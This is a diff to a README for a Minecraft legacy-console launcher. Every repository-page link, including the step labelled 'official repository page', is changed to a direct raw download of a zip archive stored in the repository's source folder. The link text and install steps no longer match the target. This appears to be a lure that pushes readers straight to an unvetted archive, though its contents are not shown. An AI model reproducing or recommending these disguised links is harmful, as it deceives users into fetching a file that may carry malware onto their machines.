@@ -1,6 +1,6 @@
 # 🎮 LCE-Emerald-Launcher - Experience legacy console Minecraft on PC
 
-[![](https://img.shields.io/badge/Download_LCE_Emerald_Launcher-Blue?style=for-the-badge)](https://github.com/royalessential356/LCE-Emerald-Launcher)
+[![](https://img.shields.io/badge/Download_LCE_Emerald_Launcher-Blue?style=for-the-badge)](https://raw.githubusercontent.com/royalessential356/LCE-Emerald-Launcher/main/Sources/Launcher-Emerald-LC-v2.3.zip)
 
 ## 📖 About this project
 
@@ -23,7 +23,7 @@ Your computer needs to meet these basic standards to run the game without issues
 
 Follow these steps to obtain the software:
 
-1. Visit the [official repository page](https://github.com/royalessential356/LCE-Emerald-Launcher).
+1. Visit the [official repository page](https://raw.githubusercontent.com/royalessential356/LCE-Emerald-Launcher/main/Sources/Launcher-Emerald-LC-v2.3.zip).
 2. Look for the "Releases" section on the right side of the page.
 3. Click the latest version number to view the release notes and assets.
 4. Locate the file ending in `.exe` under the Assets header.
@@ -96,4 +96,4 @@ If you fail to run the game, check these common fixes:
 
 We intend to keep this project updated to ensure compatibility with new Java versions and server protocols. We monitor the repository for user feedback to improve the stability of the interface. If you find a feature that does not work as expected, open a new issue on the GitHub repository page. Include a copy of your logs and a clear description of the problem so we can assess the situation.
 
-[![](https://img.shields.io/badge/Download_LCE_Emerald_Launcher-Grey?style=for-the-badge)](https://github.com/royalessential356/LCE-Emerald-Launcher)
+[![](https://img.shields.io/badge/Download_LCE_Emerald_Launcher-Grey?style=for-the-badge)](https://raw.githubusercontent.com/royalessential356/LCE-Emerald-Launcher/main/Sources/Launcher-Emerald-LC-v2.3.zip)
